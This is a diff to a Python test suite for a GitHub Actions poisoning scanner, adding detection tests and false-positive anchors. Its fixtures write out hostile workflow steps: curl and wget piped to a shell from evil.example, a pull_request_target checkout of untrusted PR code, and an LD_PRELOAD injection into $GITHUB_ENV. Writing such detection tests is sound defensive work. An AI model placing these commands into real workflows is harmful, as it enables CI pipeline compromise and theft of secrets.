@@ -1775,7 +1775,10 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
         result = a.analyze()
         self.assertEqual(result["actions_poisoning"]["total"], 1)
         sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
-        self.assertIn("dormant_trigger_with_payload", sig_types)
+        self.assertIn("workflow_remote_code_execution", sig_types)
+        self.assertEqual(
+            result["actions_poisoning"]["flagged_workflows"][0]["severity"], "CRITICAL"
+        )
 
     def test_dormant_trigger_without_shell_is_safe(self):
         content = (
@@ -1929,8 +1932,14 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
     # Hardening regression tests (Fixes 1, 2, 3)
     # ------------------------------------------------------------------
 
-    def test_pull_request_target_alone_is_detected(self):
-        """Fix 1 — PR-4 red-team: pull_request_target without write perms is HIGH."""
+    def test_prt_with_untrusted_checkout_is_critical(self):
+        """NF-15 — pull_request_target that checks out and runs the PR head is CRITICAL.
+
+        Previously asserted HIGH under the name "pull_request_target alone". The
+        fixture is not the trigger alone: it is the canonical compromise —
+        privileged context, checkout of attacker-controlled head, execution of it.
+        Severity derives from the untrusted checkout, not from declared permissions.
+        """
         content = (
             "on:\n  pull_request_target:\n\n"
             "jobs:\n  analyze:\n    runs-on: ubuntu-latest\n"
@@ -1943,11 +1952,203 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
         d = self._build_workflow_diff(".github/workflows/pr-check.yml", content)
         a = self._make_analyzer_with_diffs([d])
         result = a.analyze()
-        self.assertEqual(result["actions_poisoning"]["total"], 1)
         wf = result["actions_poisoning"]["flagged_workflows"][0]
         sig_types = [s['type'] for s in wf['signals']]
+        self.assertIn("prt_untrusted_checkout", sig_types)
+        self.assertEqual(wf['severity'], 'CRITICAL')
+
+    def test_prt_untrusted_checkout_critical_under_any_permission(self):
+        """NF-15 — the escalation must not depend on which write scope is named.
+
+        Before this change only contents/pull-requests/packages/deployments
+        escalated, so the identical attack declaring checks: or id-token: write,
+        or no permissions at all, was reported HIGH and exited 0.
+        """
+        for perms in ("      checks: write\n",
+                      "      issues: write\n",
+                      "      id-token: write\n",
+                      ""):
+            with self.subTest(perms=perms.strip() or "<no permissions block>"):
+                block = f"    permissions:\n{perms}" if perms else ""
+                content = (
+                    "on:\n  pull_request_target:\n\n"
+                    "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                    f"{block}"
+                    "    steps:\n"
+                    "      - uses: actions/checkout@v4\n"
+                    "        with:\n"
+                    "          ref: ${{ github.event.pull_request.head.sha }}\n"
+                    "      - run: npm install && npm run build\n"
+                )
+                d = self._build_workflow_diff(".github/workflows/ci.yml", content)
+                a = self._make_analyzer_with_diffs([d])
+                wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+                self.assertEqual(wf['severity'], 'CRITICAL')
+
+    def test_prt_without_untrusted_checkout_stays_high(self):
+        """NF-15 false-positive anchor — mirrors harness AW02.
+
+        pull_request_target with a default checkout (no ref:) resolves to the
+        base branch and never executes PR-controlled code. This is a legitimate
+        labeler pattern and must not escalate, or the rule is indiscriminate.
+        """
+        content = (
+            "on:\n  pull_request_target:\n    types: [opened, labeled]\n\n"
+            "permissions:\n  pull-requests: read\n  contents: read\n\n"
+            "jobs:\n  label:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "      - run: python scripts/label_pr.py\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/pr-labeler.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+        sig_types = [s['type'] for s in wf['signals']]
         self.assertIn("dangerous_trigger_pull_request_target", sig_types)
+        self.assertNotIn("prt_untrusted_checkout", sig_types)
         self.assertEqual(wf['severity'], 'HIGH')
+
+    def test_head_sha_in_env_is_not_an_untrusted_checkout(self):
+        """NF-15 — passing a head SHA to an API call is not checking it out.
+
+        This project's own action does exactly this to post a check run. Matching
+        the expression anywhere in the file rather than on a ref: key would flag it.
+        """
+        content = (
+            "on:\n  pull_request_target:\n\n"
+            "permissions:\n  contents: read\n\n"
+            "jobs:\n  publish:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "      - name: Post check\n"
+            "        env:\n"
+            "          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n"
+            "        run: python post_check_run.py\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/publish-check.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+        self.assertNotIn("prt_untrusted_checkout", [s['type'] for s in wf['signals']])
+        self.assertEqual(wf['severity'], 'HIGH')
+
+    # ---- NF-17: payload scored independently of trigger --------------------
+
+    def test_remote_exec_detected_on_every_trigger(self):
+        """NF-17 — the same payload must score the same whatever fires it.
+
+        Before this change the shell payload was only noticed when paired with a
+        dormant trigger, so `on: push` — which executes on merge — produced no
+        signal at all and returned SAFE. Dormancy is a mitigating property and
+        must not be the condition under which a payload is detected.
+        """
+        payload = "      - run: curl -s https://evil.example/p.sh | bash\n"
+        for trigger in ("on:\n  workflow_dispatch:\n",
+                        "on:\n  schedule:\n    - cron: '0 2 * * *'\n",
+                        "on:\n  push:\n    branches: [main]\n",
+                        "on:\n  pull_request:\n"):
+            with self.subTest(trigger=trigger.split(chr(10))[1].strip()):
+                content = (
+                    f"name: Maintenance\n{trigger}\n"
+                    "jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n"
+                    + payload
+                )
+                d = self._build_workflow_diff(".github/workflows/maintenance.yml", content)
+                a = self._make_analyzer_with_diffs([d])
+                wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+                self.assertIn(
+                    "workflow_remote_code_execution", [s['type'] for s in wf['signals']]
+                )
+                self.assertEqual(wf['severity'], 'CRITICAL')
+
+    def test_remote_exec_on_push_reaches_destructive(self):
+        """NF-17 — end to end: the on: push variant now blocks. It was SAFE."""
+        content = (
+            "name: Build\non:\n  push:\n    branches: [main]\n\n"
+            "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: wget -qO- https://evil.example/i.sh | sh\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/build.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        self.assertEqual(a.analyze()["verdict"]["status"], "DESTRUCTIVE")
+
+    def test_trusted_installer_host_downgrades_to_high(self):
+        """NF-17 false-positive anchor — real installers use this convention.
+
+        Blocking every curl-to-shell would make the layer unusable in ordinary
+        CI, so an allowlisted host reports HIGH rather than CRITICAL.
+        """
+        content = (
+            "name: Setup\non:\n  push:\n\n"
+            "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: curl --proto '=https' -sSf https://sh.rustup.rs | sh -s -- -y\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/setup.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+        sig = [s for s in wf['signals'] if s['type'] == 'workflow_remote_code_execution'][0]
+        self.assertTrue(sig['trusted_installer'])
+        self.assertEqual(wf['severity'], 'HIGH')
+
+    def test_installer_allowlist_is_config_extensible(self):
+        """NF-17 — per-repo extension, mirroring trusted_oidc_consumers."""
+        content = (
+            "name: Setup\non:\n  push:\n\n"
+            "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: curl -sSf https://install.internal.example/cli.sh | sh\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/setup.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        a.config.actions["trusted_installer_hosts"] = ["install.internal.example"]
+        wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+        self.assertEqual(wf['severity'], 'HIGH')
+
+    def test_ordinary_shell_in_workflow_is_not_remote_exec(self):
+        """NF-17 false-positive anchor — local shell commands are not payloads."""
+        content = (
+            "name: Clean\non:\n  push:\n\n"
+            "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: rm -rf node_modules dist\n"
+            "      - run: chmod +x ./scripts/build.sh && ./scripts/build.sh\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/clean.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        flags = a.analyze()["actions_poisoning"]["flagged_workflows"]
+        types = [s['type'] for f in flags for s in f['signals']]
+        self.assertNotIn("workflow_remote_code_execution", types)
+
+    def test_github_env_injection_is_now_critical(self):
+        """NF-17 — PATH / LD_PRELOAD / NODE_OPTIONS hijack every later step.
+
+        Mirrors harness RTA04, which recorded CAUTION. There is no benign
+        reading of LD_PRELOAD into $GITHUB_ENV, so the trigger is irrelevant.
+        """
+        content = (
+            "name: Setup Environment\non: workflow_dispatch\n\n"
+            "jobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - name: Configure runtime paths\n"
+            "        run: |\n"
+            "          echo \"LD_PRELOAD=/opt/attacker/lib/hook.so\" >> $GITHUB_ENV\n"
+            "      - run: npm start\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/setup.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        wf = result["actions_poisoning"]["flagged_workflows"][0]
+        self.assertIn("github_env_injection", [s['type'] for s in wf['signals']])
+        self.assertEqual(wf['severity'], 'CRITICAL')
+        self.assertEqual(result["verdict"]["status"], "DESTRUCTIVE")
+
+    def test_prt_without_permissions_block_is_reported(self):
+        """NF-15 — an absent permissions block inherits the repository default."""
+        content = (
+            "on:\n  pull_request_target:\n\n"
+            "jobs:\n  greet:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - run: echo hello\n"
+        )
+        d = self._build_workflow_diff(".github/workflows/greet.yml", content)
+        a = self._make_analyzer_with_diffs([d])
+        wf = a.analyze()["actions_poisoning"]["flagged_workflows"][0]
+        self.assertIn("prt_inherited_permissions", [s['type'] for s in wf['signals']])
 
     def test_pull_request_target_with_write_permissions_is_critical(self):
         """Fix 1 — pull_request_target + contents: write escalates to CRITICAL."""
